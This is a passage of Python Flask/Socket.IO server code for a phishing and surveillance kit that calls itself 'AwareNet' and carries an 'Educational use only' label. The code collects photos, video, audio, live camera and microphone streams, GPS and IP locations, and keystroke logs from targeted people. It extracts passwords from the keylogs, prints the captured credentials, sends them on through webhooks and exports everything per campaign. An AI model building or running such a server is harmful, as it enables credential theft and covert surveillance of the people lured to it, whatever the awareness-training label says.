    return jsonify({"status": "ok", "deleted": len(ids)})

# ── API: Captures ──
@app.route("/api/targets/search", methods=["GET"])
def api_target_search():
    attacker_required()
    q = request.args.get("q", "").strip().lower()
    if len(q) < 2:
        return jsonify({"error": "Query too short"}), 400
    conn = get_db()
    like_pattern = f"%{q}%"
    targets_list = [dict(r) for r in conn.execute(
        "SELECT * FROM targets WHERE LOWER(alias) LIKE ? OR LOWER(ip) LIKE ? OR LOWER(id) LIKE ? OR LOWER(slug) LIKE ? ORDER BY connected_at DESC LIMIT 50",
        (like_pattern, like_pattern, like_pattern, like_pattern)).fetchall()]
    # Filter out targets whose upload folder no longer exists on disk (check rpath puis legacy)
    def _has_upload_dir(alias):
        return os.path.isdir(rpath("uploads", alias)) or os.path.isdir(os.path.join("uploads", alias))
    targets_list = [t for t in targets_list if _has_upload_dir(t["alias"])]
    for t in targets_list:
        t["captures_data"] = [dict(r) for r in conn.execute(
            "SELECT * FROM captures WHERE target_id=? ORDER BY id DESC", (t["id"],)).fetchall()]
        t["events_data"] = [dict(r) for r in conn.execute(
            "SELECT * FROM events WHERE target_id=? ORDER BY id DESC LIMIT 20", (t["id"],)).fetchall()]
    seen_aliases = {t["alias"] for t in targets_list}
    # Liste les dossiers orphelins dans rpath/uploads et uploads legacy
    _upload_roots = []
    for _root in (rpath("uploads"), "uploads"):
        if os.path.isdir(_root) and _root not in _upload_roots:
            _upload_roots.append(_root)
    for _upload_root in _upload_roots:
        for folder in sorted(os.listdir(_upload_root)):
            folder_path = os.path.join(_upload_root, folder)
            if not os.path.isdir(folder_path) or folder in seen_aliases:
                continue
            if q not in folder.lower():
                continue
            files = []
            for fname in sorted(os.listdir(folder_path)):
                fpath = os.path.join(folder_path, fname)
                if not os.path.isfile(fpath):
                    continue
                ext = os.path.splitext(fname)[1].lower()
                if ext in ('.jpg','.jpeg','.png','.gif','.webp'): ctype = 'photo'
                elif ext in ('.mp4','.webm','.mov','.avi'): ctype = 'video'
                elif ext in ('.mp3','.wav','.ogg','.m4a'): ctype = 'audio'
                elif 'keylog' in fname.lower(): ctype = 'keylog'
                else: ctype = 'file'
                files.append({"id":0,"target_id":folder,"type":ctype,"file_path":f"uploads/{folder}/{fname}","password_text":"","created_at":""})
            targets_list.append({
                "id":folder,"sid":"","alias":folder,"ip":"N/A","user_agent":"",
                "template":"","slug":"N/A","campaign":"","status":"deleted",
                "connected_at":"","lat":None,"lng":None,"captures":len(files),
                "last_seen":"","first_click_at":"","is_bot":0,
                "notes":"Target entry was deleted from database, media files remain in uploads",
                "captures_data":files,"events_data":[]
            })
    return jsonify(targets_list)

@app.route("/api/captures", methods=["GET"])
def api_get_captures():
    attacker_required()
    return jsonify(get_all_captures())

# ── API: Password analysis ──
@app.route("/api/password/analyze", methods=["POST"])
def api_analyze_password():
    attacker_required()
    data = request.json or {}
    password = data.get("password", "")
    result = analyze_password_strength(password)
    return jsonify({"password": password, "strength": result})

@app.route("/api/passwords/stats", methods=["GET"])
def api_password_stats():
    attacker_required()
    conn = get_db()
    rows = conn.execute("SELECT password_text, password_strength FROM captures WHERE password_text != ''").fetchall()
    total = len(rows)
    weak = sum(1 for r in rows if r["password_strength"] == "weak")
    medium = sum(1 for r in rows if r["password_strength"] == "medium")
    strong = sum(1 for r in rows if r["password_strength"] == "strong")
    passwords = [r["password_text"] for r in rows if r["password_text"]]
    common = {}
    for p in passwords:
        common[p] = common.get(p, 0) + 1
    reused = {p: c for p, c in common.items() if c > 1}
    return jsonify({
        "total": total, "weak": weak, "medium": medium, "strong": strong,
        "reused_passwords": len(reused),
        "unique_passwords": len(passwords) - len(reused),
    })

# ── API: Translations ──
@app.route("/api/translations", methods=["GET"])
def api_get_translations():
    lang = request.args.get("lang", "en")
    conn = get_db()
    rows = conn.execute("SELECT key, value FROM translations WHERE lang=?", (lang,)).fetchall()
    result = {r["key"]: r["value"] for r in rows}
    return jsonify({"lang": lang, "translations": result})

@app.route("/api/translations", methods=["POST"])
def api_set_translation():
    attacker_required()
    data = request.json or {}
    lang = data.get("lang", "en")
    key = data.get("key", "")
    value = data.get("value", "")
    if not key:
        return jsonify({"error": "Missing key"}), 400
    conn = get_db()
    conn.execute("INSERT OR REPLACE INTO translations (lang, key, value) VALUES (?,?,?)",
                 (lang, key, value))
    conn.commit()
    return jsonify({"status": "ok"})

@app.route("/api/languages", methods=["GET"])
def api_get_languages():
    conn = get_db()
    rows = conn.execute("SELECT DISTINCT lang FROM translations").fetchall()
    langs = [r["lang"] for r in rows]
    return jsonify({"languages": langs})

# ── API: Events ──
@app.route("/api/events")
def get_events():
    return jsonify(get_recent_events(200))

@app.route("/api/webhooks", methods=["GET", "POST"])
def api_webhooks():
    attacker_required()
    if request.method == "POST":
        data = request.json or []
        save_webhook_config(data)
        webhook_notifier.load(get_webhook_configs())
        log_event("webhook", "Webhook configuration updated")
        return jsonify({"status": "saved"})
    return jsonify(get_webhook_configs())

@app.route("/api/security/banned", methods=["GET"])
def api_get_banned():
    attacker_required()
    return jsonify(get_banned_ips())

@app.route("/api/security/unban", methods=["POST"])
def api_unban():
    attacker_required()
    ip = (request.json or {}).get("ip", "")
    if not ip:
        return jsonify({"error": "IP required"}), 400
    unban_ip(ip)
    log_event("security", f"Unbanned IP: {ip}")
    return jsonify({"status": "unbanned"})

@app.route("/api/security/panel-access", methods=["GET"])
def api_panel_access():
    attacker_required()
    limit = request.args.get("limit", 100, type=int)
    return jsonify(get_panel_access_log(limit))

@app.route("/api/delete/all", methods=["DELETE"])
def delete_all():
    attacker_required()
    events.clear()
    log_event("cleanup", "UI events and panel logs cleared (files kept on disk)")
    return jsonify({"deleted": 0, "status": "ui_cleared"})

# ── Report endpoints ──
@app.route("/api/report")
def api_report():
    attacker_required()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    stats = get_stats_summary()
    lines = [
        "AWARENET SESSION REPORT",
        f"Generated: {now}",
        "",
        "SUMMARY",
        f"  Campaigns: {stats['campaigns']}",
        f"  Targets: {stats['targets']}",
        f"  Active: {stats['active_targets']}",
        f"  Captures: {stats['captures']}",
        f"  Photos: {stats['photos']}",
        f"  Videos: {stats['videos']}",
        f"  Audio: {stats['audio']}",
        f"  Keylogs: {stats['keylogs']}",
        "",
        "CAMPAIGNS:",
    ]
    for c in get_all_campaigns():
        lines.append(f"  [{c['status']}] {c['name']} /{c['slug']} {c['template']} hits:{c['hits']} captures:{c['captures']}")
    lines.extend(["", "EVENTS:"])
    for e in get_recent_events(100):
        lines.append(f"  [{e['time']}] [{e['kind']}] {e['detail']}")
    lines.extend(["", "Educational use only."])
    return Response("\n".join(lines), mimetype="text/plain",
                    headers={"Content-disposition": f"attachment; filename=awarenet-report-{int(time.time())}.txt"})

@app.route("/api/report/csv")
def api_report_csv():
    attacker_required()
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["Type", "Campaign", "Target", "Timestamp", "Details"])
    for c in get_all_campaigns():
        writer.writerow(["campaign", c["name"], "", c["created_at"], f"{c['template']} hits:{c['hits']}"])
    for t in get_all_targets():
        writer.writerow(["target", t.get("campaign", ""), t["alias"], t["connected_at"], t["status"]])
    for e in get_recent_events(500):
        writer.writerow(["event", e["campaign"], "", e["time"], f"[{e['kind']}] {e['detail']}"])
    return Response(output.getvalue(), mimetype="text/csv",
                    headers={"Content-disposition": f"attachment; filename=awarenet-report-{int(time.time())}.csv"})

@app.route("/api/report/pdf")
def api_report_pdf():
    attacker_required()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    stats = get_stats_summary()
    lines = f"""AWARENET COMPLIANCE REPORT
{'='*60}
Generated: {now}

EXECUTIVE SUMMARY
{'='*60}
Total Campaigns: {stats['campaigns']}
Total Targets: {stats['targets']}
Active Targets: {stats['active_targets']}
Total Captures: {stats['captures']}
Total Page Hits: {stats['hits']}
Total Submissions: {stats['submissions']}

Media Captures:
  Photos: {stats['photos']}
  Videos: {stats['videos']}
  Audio: {stats['audio']}
  Keylogs: {stats['keylogs']}

CAMPAIGN DETAILS
{'='*60}
"""
    for c in get_all_campaigns():
        click_rate = 0
        if c["hits"] > 0:
            click_rate = round((c["captures"] / c["hits"]) * 100, 1)
        lines += f"""
Campaign: {c['name']}
  Slug: /{c['slug']}
  Template: {c['template']}
  Status: {c['status']}
  Hits: {c['hits']}
  Captures: {c['captures']}
  Click Rate: {click_rate}%
  Created: {c['created_at']}
{'─'*40}
"""
    lines += f"""

{'='*60}
Educational Use Only
AwareNet Security Awareness Simulation Lab
{'='*60}
"""
    return Response(lines, mimetype="text/plain",
                    headers={"Content-disposition": f"attachment; filename=awarenet-compliance-{int(time.time())}.txt"})

@app.route("/api/campaigns/<slug>/export")
def api_campaign_export(slug):
    attacker_required()
    c = get_or_create_campaign(slug)
    if not c:
        return jsonify({"error": "Not found"}), 404
    conn = get_db()
    captures = conn.execute("SELECT * FROM captures WHERE slug=? ORDER BY id", (slug,)).fetchall()
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        # Add a summary text file
        summary = f"Campaign: {c['name']} ({slug})\nTemplate: {c['template']}\nCaptures: {len(captures)}\n\n"
        for cap in captures:
            fpath = cap["file_path"]
            if fpath and os.path.exists(fpath):
                arcname = os.path.join(cap["type"], os.path.basename(fpath))
                z.write(fpath, arcname)
                summary += f"  [{cap['type']}] {arcname}\n"
            else:
                summary += f"  [{cap['type']}] (file missing: {fpath})\n"
        z.writestr("_summary.txt", summary)
    buf.seek(0)
    return Response(buf.getvalue(), mimetype="application/zip",
                    headers={"Content-disposition": f"attachment; filename={slug}-export-{int(time.time())}.zip"})

@app.route("/api/campaigns/<slug>/export/json")
def api_campaign_export_json(slug):
    attacker_required()
    c = get_or_create_campaign(slug)
    if not c:
        return jsonify({"error": "Not found"}), 404
    conn = get_db()
    export = {
        "campaign": c,
        "targets": [dict(r) for r in conn.execute("SELECT * FROM targets WHERE slug=?", (slug,)).fetchall()],
        "captures": [dict(r) for r in conn.execute("SELECT * FROM captures WHERE slug=?", (slug,)).fetchall()],
        "events": [dict(r) for r in conn.execute("SELECT * FROM events WHERE campaign=?", (slug,)).fetchall()],
    }
    resp = jsonify(export)
    resp.headers["Content-Disposition"] = f'attachment; filename="campaign_{slug}.json"'
    return resp

@app.route("/api/bounce_report", methods=["GET", "POST"])
def api_bounce_report():
    attacker_required()
    if request.method == "POST":
        text = request.form.get("report_text", "")
    else:
        text = request.args.get("report_text", "")
    import time
    return Response(text, mimetype="text/plain",
                    headers={"Content-disposition": f"attachment; filename=awarenet-health-{int(time.time())}.txt"})

@app.route("/uploads/<alias>/<fname>")
def serve_upload(alias, fname):
    dl = request.args.get("dl")
    target_dir = rpath("uploads", safe_name(alias))
    fp = os.path.join(target_dir, fname)
    if os.path.exists(fp):
        return send_from_directory(target_dir, fname, as_attachment=bool(dl))
    # fallback legacy
    legacy_dir = os.path.join("uploads", safe_name(alias))
    if os.path.exists(os.path.join(legacy_dir, fname)):
        return send_from_directory(legacy_dir, fname, as_attachment=bool(dl))
    return send_from_directory(target_dir, fname, as_attachment=bool(dl))

# ── HTTP video upload ──
@app.route("/api/upload/video", methods=["POST"])
def upload_video():
    print("  [DEBUG] Received a video upload request...")
    alias = request.form.get("alias", "unknown")
    safe_alias = safe_name(alias)
    slug = request.form.get("slug", "")
    template = request.form.get("template", "unknown")
    file = request.files.get("video")
    if not file:
        log_event("error", "Video upload failed: No file in request")
        return jsonify({"error": "no file"}), 400
    try:
        data = file.read()
        if len(data) < 100:
            log_event("error", f"Video upload failed: File too small ({len(data)} bytes)")
            return jsonify({"error": "file too small"}), 400
        ext = "mp4" if file.mimetype and "mp4" in file.mimetype else "webm"
        fname = f"video_{safe_alias}_{datetime.now().strftime('%H%M%S_%f')}.{ext}"
        target_dir = rpath("uploads", safe_alias)
        os.makedirs(target_dir, exist_ok=True)
        fpath = os.path.join(target_dir, fname)
        print(f"  [DEBUG] Saving video to: {os.path.abspath(fpath)} ({len(data)//1024}KB)")
        with open(fpath, "wb") as fh:
            fh.write(data)
        if os.path.exists(fpath):
            log_event("video", f"SUCCESS: Video saved ({len(data)//1024}KB)", slug)
        else:
            log_event("error", f"FAILED: Video file not created at {fpath}")
        c = get_or_create_campaign(slug)
        if c:
            increment_campaign_captures(slug)
            target_id = ""
            conn = get_db()
            row = conn.execute("SELECT id FROM targets WHERE alias=?", (alias,)).fetchone()
            if row:
                target_id = row["id"]
            save_capture(target_id, slug, "video", fpath)
        socketio.emit("video_received", {
            "sid": "", "alias": alias, "fname": fname,
            "url": f"/uploads/{safe_alias}/{fname}", "slug": slug,
            "time": datetime.now().strftime("%H:%M:%S"),
        }, room="attacker")
    except Exception as e:
        log_event("error", f"HTTP video upload failed: {e}")
        return jsonify({"error": str(e)}), 500
    return jsonify({"status": "ok", "fname": fname})

@app.route("/api/upload/audio", methods=["POST"])
def upload_audio():
    alias = request.form.get("alias", "unknown")
    safe_alias = safe_name(alias)
    slug = request.form.get("slug", "")
    file = request.files.get("audio")
    if not file:
        log_event("error", f"Audio upload failed: No file from {alias}")
        return jsonify({"error": "no file"}), 400
    try:
        data = file.read()
        if len(data) < 100:
            log_event("error", f"Audio upload failed: File too small ({len(data)} bytes)")
            return jsonify({"error": "file too small"}), 400
        mimetype = file.mimetype or ""
        if "webm" in mimetype: ext = "webm"
        elif "mp4" in mimetype or "m4a" in mimetype: ext = "m4a"
        elif "ogg" in mimetype: ext = "ogg"
        elif "wav" in mimetype: ext = "wav"
        else: ext = "webm"
        fname = f"audio_{safe_alias}_{datetime.now().strftime('%H%M%S_%f')}.{ext}"
        target_dir = rpath("uploads", safe_alias)
        os.makedirs(target_dir, exist_ok=True)
        fpath = os.path.join(target_dir, fname)
        with open(fpath, "wb") as fh:
            fh.write(data)
        log_event("audio", f"SUCCESS: Audio saved ({len(data)//1024}KB)", slug)
        c = get_or_create_campaign(slug)
        if c:
            increment_campaign_captures(slug)
            target_id = ""
            conn = get_db()
            row = conn.execute("SELECT id FROM targets WHERE alias=?", (alias,)).fetchone()
            if row:
                target_id = row["id"]
            save_capture(target_id, slug, "audio", fpath)
        socketio.emit("audio_received", {
            "sid": "", "alias": alias, "fname": fname,
            "url": f"/uploads/{safe_alias}/{fname}", "slug": slug,
            "time": datetime.now().strftime("%H:%M:%S"),
        }, room="attacker")
    except Exception as e:
        log_event("error", f"Audio upload failed: {e}")
        return jsonify({"error": str(e)}), 500
    return jsonify({"status": "ok", "fname": fname})

# ── IP Geolocation with caching ──
def geo_fields(data):
    parts = []
    if data.get("country"): parts.append(f"Country: {data['country']}")
    if data.get("city"): parts.append(f"City: {data['city']}")
    if data.get("zip"): parts.append(f"Postal: {data['zip']}")
    if data.get("regionName"): parts.append(f"Region: {data['regionName']}")
    if data.get("isp"): parts.append(f"ISP: {data['isp']}")
    if data.get("org"): parts.append(f"Org: {data['org']}")
    return "\n".join(parts)

def save_geo_file(sid, lat, lng, source, extra=""):
    try:
        t = targets.get(sid)
        if not t:
            return
        alias = t.get("alias", "unknown")
        safe_alias = safe_name(alias)
        target_dir = rpath("uploads", safe_alias)
        os.makedirs(target_dir, exist_ok=True)
        fname = f"geo_{safe_alias}_{datetime.now().strftime('%H%M%S')}.txt"
        lines = [
            f"Source: {source}",
            f"Latitude: {lat}",
            f"Longitude: {lng}",
            f"Coordinates: {lat}, {lng}",
        ]
        if extra:
            lines.append("")
            lines.append(extra)
        content = "\n".join(lines)
        with open(os.path.join(target_dir, fname), "w", encoding="utf-8") as f:
            f.write(content)
    except Exception:
        pass

def ip_geolocate(sid, ip, slug):
    try:
        now = time.time()
        cached = geoip_cache.get(ip)
        if cached and (now - cached["ts"]) < geoip_cache_ttl:
            lat, lng = cached["lat"], cached["lng"]
            extra = cached.get("extra", "")
        else:
            url = f"http://ip-api.com/json/{ip}?fields=status,lat,lon,country,city,zip,regionName,isp,org"
            with urlopen(url, timeout=5) as resp:
                data = json.loads(resp.read().decode())
            if data.get("status") != "success":
                return
            lat, lng = data["lat"], data["lng"]
            extra = geo_fields(data)
            geoip_cache[ip] = {"lat": lat, "lng": lng, "extra": extra, "ts": now}
        if sid in targets:
            targets[sid]["lat"] = lat
            targets[sid]["lng"] = lng
            alias = targets[sid]["alias"]
            log_event("location", f"{alias} IP location: {lat}, {lng} (approximate)", slug)
            socketio.emit("target_location_update", {
                "sid": sid, "alias": alias, "lat": lat, "lng": lng
            }, room="attacker")
            save_geo_file(sid, lat, lng, "IP Geolocation (ip-api.com)", extra)
    except Exception:
        pass

# ── Socket: Target ──
@socketio.on("target_connect")
def on_target_connect(data):
    sid = request.sid
    ip = client_ip()
    slug = data.get("slug", "")
    c = get_or_create_campaign(slug) or {}
    alias = data.get("alias", "").strip()
    if not alias:
        rand_suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
        alias = f"Target-{rand_suffix}"
    # Remove stale target entry with same alias (reconnect case)
    old_sid = next((s for s, t in targets.items() if t.get("alias") == alias and s != sid), None)
    if old_sid:
        targets.pop(old_sid, None)
    ua = request.headers.get("User-Agent", "")
    target_id = str(uuid.uuid4())[:8]
    targets[sid] = {
        "sid": sid, "id": target_id, "alias": alias, "ip": ip,
        "user_agent": ua,
        "template": data.get("template", "zoom"), "slug": slug,
        "campaign": c.get("name", slug), "status": "waiting",
        "connected_at": datetime.now().strftime("%H:%M:%S"),
        "captures": 0, "lastSnap": None,
        "facing": "user", "lat": None, "lng": None, "is_bot": 0,
        "_last_seen": time.time()
    }
    save_target(targets[sid])
    threading.Thread(target=save_device_info, args=(sid,), daemon=True).start()
    join_room("targets")
    log_event("connect", f"{alias} joined '{c.get('name', slug)}'", slug)
    socketio.emit("target_joined", targets[sid], room="attacker")
    emit("registered", {"id": target_id, "alias": alias})
    if c.get("precise_location", False) and ip:
        threading.Thread(target=ip_geolocate, args=(sid, ip, slug), daemon=True).start()
    threading.Thread(target=webhook_notifier.notify, args=("capture", {"alias": alias, "slug": slug, "type": "join"}), daemon=True).start()

@socketio.on("target_camera_ready")
def on_camera_ready(data):
    sid = request.sid
    if sid in targets:
        targets[sid]["status"] = "active"
        save_target(targets[sid])
        log_event("camera", f"{targets[sid]['alias']} granted camera", targets[sid]["slug"])
        socketio.emit("target_status_update", {"sid": sid, "status": "active"}, room="attacker")

@socketio.on("target_permission_refused")
def on_target_permission_refused(data):
    sid = request.sid
    if sid in targets:
        targets[sid]["status"] = "refused"
        save_target(targets[sid])
        alias = targets[sid]["alias"]
        slug = targets[sid]["slug"]
        log_event("error", f"la cible {alias} a refusé les autorisations", slug)
        socketio.emit("target_status_update", {"sid": sid, "status": "refused"}, room="attacker")

@socketio.on("link_click")
def on_link_click(data):
    slug = data.get("slug", "")
    alias = data.get("alias", "unknown")
    url = data.get("url", "")
    text = data.get("text", "")
    log_event("link", f"{alias} clicked: {text} -> {url}", slug)
    socketio.emit("link_clicked", {"slug": slug, "alias": alias, "url": url, "text": text}, room="attacker")

@socketio.on("target_location")
def on_target_location(data):
    sid = request.sid
    if sid in targets:
        lat = data.get("lat")
        lng = data.get("lng")
        targets[sid]["lat"] = lat
        targets[sid]["lng"] = lng
        alias = targets[sid]["alias"]
        log_event("location", f"{alias} location: {lat}, {lng}", targets[sid].get("slug", ""))
        socketio.emit("target_location_update", {
            "sid": sid, "alias": alias, "lat": lat, "lng": lng
        }, room="attacker")
        save_geo_file(sid, lat, lng, "Browser GPS (precise)")

@socketio.on("target_error")
def on_target_error(data):
    sid = request.sid
    t = targets.get(sid, {})
    alias = t.get("alias", data.get("alias", "unknown"))
    slug = t.get("slug", data.get("slug", ""))
    log_event("error", f"{alias}: {data.get('message', '')}", slug)

@socketio.on("photo_result")
def on_photo_result(data):
    sid = request.sid
    t = targets.get(sid, {})
    alias = t.get("alias", "unknown")
    safe_alias = safe_name(alias)
    slug = t.get("slug", "")
    image_b64 = data.get("image", "")
    template = data.get("template", "unknown")
    if not image_b64:
        log_event("error", f"Empty photo received from {alias}")
        return
    wh_data = {"alias": alias, "slug": slug, "type": "photo"}
    fname = ""
    fpath = ""
    try:
        if "," in image_b64:
            raw = image_b64.split(",", 1)[-1]
        else:
            raw = image_b64
        img_bytes = base64.b64decode(raw)
        if len(img_bytes) < 100:
            log_event("error", f"Photo too small ({len(img_bytes)} bytes) from {alias}")
        else:
            fname = f"photo_{safe_alias}_{datetime.now().strftime('%H%M%S_%f')}.jpg"
            target_dir = rpath("uploads", safe_alias)
            os.makedirs(target_dir, exist_ok=True)
            fpath = os.path.join(target_dir, fname)
            print(f"  [DEBUG] Saving photo to: {os.path.abspath(fpath)}")
            with open(fpath, "wb") as f:
                f.write(img_bytes)
            if os.path.exists(fpath):
                log_event("photo", f"SUCCESS: Photo saved ({len(img_bytes)//1024}KB)", slug)
                wh_data["url"] = f"/uploads/{safe_alias}/{fname}"
                socketio.emit("photo_received", {
                    "sid": sid, "alias": alias, "image": image_b64, "fname": fname,
                    "url": f"/uploads/{safe_alias}/{fname}",
                    "template": template, "slug": slug, "campaign": t.get("campaign", ""),
                    "time": datetime.now().strftime("%H:%M:%S"),
                }, room="attacker")
            else:
                log_event("error", f"FAILED: File not created at {fpath}")
    except Exception as e:
        log_event("error", f"Photo save failed: {e}")
    if sid in targets:
        targets[sid]["captures"] += 1
        targets[sid]["status"] = "captured"
        save_target(targets[sid])
    c = get_or_create_campaign(slug)
    if c:
        increment_campaign_captures(slug)
    if fpath:
        save_capture(t.get("id", ""), slug, "photo", fpath)
    socketio.emit("target_status_update", {
        "sid": sid, "status": "captured",
        "captures": targets.get(sid, {}).get("captures", 0),
    }, room="attacker")
    threading.Thread(target=webhook_notifier.notify, args=("capture", wh_data), daemon=True).start()

@socketio.on("audio_result")
def on_audio_result(data):
    sid = request.sid
    t = targets.get(sid, {})
    alias = t.get("alias", "unknown")
    safe_alias = safe_name(alias)
    slug = t.get("slug", "")
    audio_b64 = data.get("audio", "")
    wh_data = {"alias": alias, "slug": slug, "type": "audio"}
    fpath = ""
    if not audio_b64:
        threading.Thread(target=webhook_notifier.notify, args=("capture", wh_data), daemon=True).start()
        return
    try:
        raw = audio_b64.split(",", 1)[-1]
        aud_bytes = base64.b64decode(raw)
        ext = 'webm' if 'audio/webm' in audio_b64[:50] else 'wav'
        fname = f"audio_{safe_alias}_{datetime.now().strftime('%H%M%S_%f')}.{ext}"
        target_dir = rpath("uploads", safe_alias)
        os.makedirs(target_dir, exist_ok=True)
        fpath = os.path.join(target_dir, fname)
        with open(fpath, "wb") as f:
            f.write(aud_bytes)
        log_event("audio", f"Audio: {alias} {len(aud_bytes)//1024}KB", slug)
        socketio.emit("audio_received", {
            "sid": sid, "alias": alias, "fname": fname,
            "url": f"/uploads/{safe_alias}/{fname}", "slug": slug,
            "time": datetime.now().strftime("%H:%M:%S"),
        }, room="attacker")
    except Exception as e:
        log_event("error", f"Audio save failed: {e}")
    if sid in targets:
        targets[sid]["captures"] += 1
        targets[sid]["status"] = "captured"
        save_target(targets[sid])
    c = get_or_create_campaign(slug)
    if c:
        increment_campaign_captures(slug)
    if fpath:
        save_capture(t.get("id", ""), slug, "audio", fpath)
    socketio.emit("target_status_update", {
        "sid": sid, "status": "captured",
        "captures": targets.get(sid, {}).get("captures", 0),
    }, room="attacker")
    threading.Thread(target=webhook_notifier.notify, args=("capture", wh_data), daemon=True).start()

@socketio.on("video_result")
def on_video_result(data):
    sid = request.sid
    t = targets.get(sid, {})
    alias = t.get("alias", "unknown")
    safe_alias = safe_name(alias)
    slug = t.get("slug", "")
    video_b64 = data.get("video", "")
    wh_data = {"alias": alias, "slug": slug, "type": "video"}
    fname = ""
    fpath = ""
    try:
        raw = video_b64.split(",", 1)[-1]
        vid_bytes = base64.b64decode(raw)
        ext = 'mp4' if 'video/mp4' in video_b64[:50] else 'webm'
        fname = f"video_{safe_alias}_{datetime.now().strftime('%H%M%S_%f')}.{ext}"
        target_dir = rpath("uploads", safe_alias)
        os.makedirs(target_dir, exist_ok=True)
        fpath = os.path.join(target_dir, fname)
        with open(fpath, "wb") as f:
            f.write(vid_bytes)
        log_event("video", f"Video: {alias} {len(vid_bytes)//1024}KB", slug)
        wh_data["url"] = f"/uploads/{safe_alias}/{fname}"
        socketio.emit("video_received", {
            "sid": sid, "alias": alias, "fname": fname,
            "url": f"/uploads/{safe_alias}/{fname}", "slug": slug,
            "time": datetime.now().strftime("%H:%M:%S"),
        }, room="attacker")
    except Exception as e:
        log_event("error", f"Video save failed: {e}")
    if sid in targets:
        targets[sid]["captures"] += 1
        targets[sid]["status"] = "captured"
        save_target(targets[sid])
    c = get_or_create_campaign(slug)
    if c:
        increment_campaign_captures(slug)
    if fpath:
        save_capture(t.get("id", ""), slug, "video", fpath)
    socketio.emit("target_status_update", {
        "sid": sid, "status": "captured",
        "captures": targets.get(sid, {}).get("captures", 0),
    }, room="attacker")
    threading.Thread(target=webhook_notifier.notify, args=("capture", wh_data), daemon=True).start()

@socketio.on("live_frame_result")
def on_live_frame_result(data):
    sid = request.sid
    socketio.emit("live_frame", {"sid": sid, "image": data.get("image")}, room="attacker")

@socketio.on("live_audio_chunk")
def on_live_audio_chunk(data):
    sid = request.sid
    socketio.emit("live_audio", {"sid": sid, "audio": data.get("audio"), "mime": data.get("mime", "audio/webm")}, room="attacker")

@socketio.on("cmd_play_audio")
def cmd_play_audio(data):
    sid = data.get("sid")
    idx = data.get("idx", 0)
    fname = data.get("fname", "")
    slug = data.get("slug", "")
    # resolve filename if not provided but idx given
    if not fname and slug:
        c = get_or_create_campaign(slug)
        if c:
            try:
                files = json.loads(c.get("audio_files", "[]") or "[]")
                if 0 <= idx < len(files):
                    fname = files[idx]
            except Exception:
                pass
    # build url
    url = f"/campaign_media/{slug}/{fname}" if slug and fname else ""
    if sid:
        socketio.emit("do_play_audio", {"fname": fname, "url": url, "idx": idx, "slug": slug}, to=sid)
        log_event("command", f"Play Audio {idx+1} ({fname}) -> {targets.get(sid,{}).get('alias','?')}", slug)
    else:
        # broadcast to campaign
        if slug:
            sids = [s for s, t in targets.items() if t.get("slug") == slug]
            for s in sids:
                socketio.emit("do_play_audio", {"fname": fname, "url": url, "idx": idx, "slug": slug}, to=s)
            log_event("command", f"Play Audio {idx+1} -> campaign {slug} ({len(sids)} targets)", slug)

@socketio.on("cmd_play_video")
def cmd_play_video(data):
    sid = data.get("sid")
    slug = data.get("slug", "")
    fname = data.get("fname", "")
    repeat = bool(data.get("repeat", False))
    # if fname not provided, use campaign video_file
    if not fname and slug:
        c = get_or_create_campaign(slug)
        if c:
            fname = c.get("video_file", "")
            repeat = bool(c.get("video_repeat", False))
    url = f"/campaign_media/{slug}/{fname}" if slug and fname else ""
    payload = {"fname": fname, "url": url, "slug": slug, "repeat": repeat}
    if sid:
        socketio.emit("do_play_video", payload, to=sid)
        log_event("command", f"Play Video ({fname}) repeat={repeat} -> {targets.get(sid,{}).get('alias','?')}", slug)
    else:
        if slug:
            sids = [s for s, t in targets.items() if t.get("slug") == slug]
            for s in sids:
                socketio.emit("do_play_video", payload, to=s)
            log_event("command", f"Play Video -> campaign {slug} ({len(sids)} targets)", slug)

@socketio.on("cmd_stop_video")
def cmd_stop_video(data):
    sid = data.get("sid")
    slug = data.get("slug", "")
    if sid:
        socketio.emit("do_stop_video", {}, to=sid)
        log_event("command", f"Stop Video -> {targets.get(sid,{}).get('alias','?')}", slug)
    elif slug:
        sids = [s for s, t in targets.items() if t.get("slug") == slug]
        for s in sids:
            socketio.emit("do_stop_video", {}, to=s)
        log_event("command", f"Stop Video -> campaign {slug}", slug)
    else:
        socketio.emit("do_stop_video", {}, room="targets")
        log_event("command", "Stop Video -> ALL")

@socketio.on("keylog_result")
def on_keylog_result(data):
    sid = request.sid
    t = targets.get(sid, {})
    alias = t.get("alias", "unknown")
    safe_alias = safe_name(alias)
    slug = t.get("slug", "")
    keys = data.get("keys", "")
    if not keys:
        log_event("error", f"Empty keylog received from {alias}")
        return
    print("\n" + "="*60)
    print(f" NOUVEAUX IDENTIFIANTS CAPTURÉS DEPUIS [{alias}]")
    print("="*60)
    print(f"{keys.strip()}")
    print("="*60 + "\n")
    wh_data = {"alias": alias, "slug": slug, "type": "keylog"}
    file_saved = False
    try:
        fname = f"keylog_{safe_alias}_{datetime.now().strftime('%H%M%S')}.txt"
        target_dir = rpath("uploads", safe_alias)
        os.makedirs(target_dir, exist_ok=True)
        fpath = os.path.join(target_dir, fname)
        with open(fpath, "w", encoding="utf-8") as f:
            f.write(keys)
        display_keys = keys.strip().replace('\n', ' | ')
        if len(display_keys) > 200:
            display_keys = display_keys[:197] + "..."
        log_event("keylog", f"SUCCESS: Keylog saved - {display_keys}", slug)
        # Save password for analysis
        lines = keys.strip().split('\n')
        password_text = ""
        # Look for lines matching Pass: or password: first
        for i, line in enumerate(lines):
            lower = line.strip().lower()
            if lower.startswith("pass:") or lower.startswith("password:") or lower.startswith("mot de passe:"):
                val = line.split(":", 1)[1].strip()
                if val and len(val) > 1:
                    password_text = val
                    break
        if not password_text:
            # Fallback: last meaningful line (skip metadata like [FOCUS], [BKSP], [ENTER])
            for line in reversed(lines):
                l = line.strip()
                if len(l) > 1 and not l.startswith("[") and not l.startswith("http") and not l.startswith("/") and not l.startswith("\\"):
                    password_text = l
                    break
        save_capture(t.get("id", ""), slug, "keylog", fpath, password_text=password_text)
        wh_data["password"] = password_text
        socketio.emit("keylog_received", {
            "sid": sid, "alias": alias, "fname": fname,
            "url": f"/uploads/{safe_alias}/{fname}", "slug": slug,
            "time": datetime.now().strftime("%H:%M:%S"),
        }, room="attacker")
        file_saved = True
    except Exception as e:
        log_event("error", f"Keylog save failed: {e}")
    threading.Thread(target=webhook_notifier.notify, args=("capture", wh_data), daemon=True).start()

